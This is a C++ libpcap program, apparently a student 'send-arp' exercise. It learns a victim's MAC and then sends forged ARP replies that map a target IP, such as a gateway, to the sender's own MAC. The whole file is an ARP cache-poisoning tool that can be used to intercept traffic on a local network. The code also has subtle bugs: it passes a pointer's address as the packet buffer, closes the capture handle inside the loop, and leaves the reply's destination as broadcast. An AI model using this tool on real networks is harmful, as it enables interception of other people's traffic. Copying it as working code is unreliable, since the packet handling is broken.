#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0\n");
}

void get_my_mac(char* dev, Mac* my_mac) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFHWADDR, &ifr);
	*my_mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
	printf("My Mac: %s\n", std::string(*my_mac).c_str());
}

void get_my_ip(char* dev, Ip* my_ip) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);
	*my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	printf("My IP: %s\n", std::string(*my_ip).c_str());
}

void print_result(pcap_t* handle, EthArpPacket* packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else {
		printf("Success\n");
	}
}

int main(int argc, char* argv[]) {
	if (argc % 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac my_mac, sender_mac;
	get_my_mac(dev, &my_mac);

	Ip my_ip;
	get_my_ip(dev, &my_ip);

	printf("\n");

	for(int i = 2; i < argc; i+=2) {
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i+1]);

		EthArpPacket packet;
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = my_mac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = my_mac;
		packet.arp_.sip_ = htonl(my_ip);
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(sender_ip);

		print_result(handle, &packet);

		while(true) {
			struct pcap_pkthdr* header;
			const u_char* send_packet;
			int res = pcap_next_ex(handle, &header, &send_packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(send_packet));


			// printf("Sender IP: %s\n", std::string(Ip(ntohl(Ip(eth_arp_packet->arp_.sip_)))).c_str());
			// printf("Sender IP: %s\n", std::string(Ip(htonl(Ip(eth_arp_packet->arp_.sip_)))).c_str());
			//printf("Sender IP: %s\n", std::string(eth_arp_packet->arp_.sip_).c_str());
			//printf("Target IP: %s\n\n", std::string(packet.arp_.tip_).c_str());

			if(eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
			if(eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
			if(eth_arp_packet->arp_.sip_!= packet.arp_.tip_) continue;

			sender_mac = eth_arp_packet->arp_.smac_;
			printf("Sender MAC: %s\n", std::string(sender_mac).c_str());

			break;
		}

		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = my_mac;
		packet.arp_.sip_ = htonl(target_ip);
		packet.arp_.tmac_ = sender_mac;

		print_result(handle, &packet);
		pcap_close(handle);
	}
}
